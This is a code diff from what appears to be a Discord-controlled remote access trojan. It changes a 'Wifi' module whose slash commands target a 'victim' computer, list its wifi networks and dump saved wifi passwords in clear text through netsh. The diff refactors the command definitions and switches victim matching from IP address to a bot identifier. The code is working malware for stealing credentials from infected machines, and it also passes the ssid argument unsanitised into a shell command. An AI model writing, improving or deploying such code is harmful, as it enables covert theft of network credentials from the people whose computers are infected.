@@ -10,12 +10,15 @@ class Wifi(commands.Cog):
         self.bot = bot
         self.ip_addr = self.bot.ip_addr
         
-    @commands.slash_command(
-        description="Lists all wifi networks",
-        options=[bot.victim]
-    )
+    @commands.slash_command( )
     async def wifilist(self, ctx, victim):
-        if str(victim) == str(self.ip_addr):
+        """Lists all wifi networks
+    
+        Parameters
+        ----------
+        victim: Identifier of the affected computer (found via /listvictims).
+        """
+        if str(victim) == str(self.bot.identifier):
             ssids = []
             msg = ""
             
@@ -40,15 +43,16 @@ class Wifi(commands.Cog):
                 )
             )
 
-    @commands.slash_command(
-        description="Lists specified wifi password",
-        options=[
-            bot.victim,
-            discord.Option("ssid", description="The name of the WIFI", required=True),
-        ]
-    )
+    @commands.slash_command( )
     async def wifipass(self, ctx, victim, ssid):
-        if str(victim) == str(self.ip_addr):
+        """Lists specified wifi password
+    
+        Parameters
+        ----------
+        victim: Identifier of the affected computer (found via /listvictims).
+        ssid: The name of the WIFI
+        """
+        if str(victim) == str(self.bot.identifier):
             ssid_details = os.popen(f"""netsh wlan show profile "{ssid}" key=clear""").read()
             ciphers = re.findall(r"Cipher\s(.*)", ssid_details)
             ciphers = "/".join([c.strip().strip(":").strip() for c in ciphers])
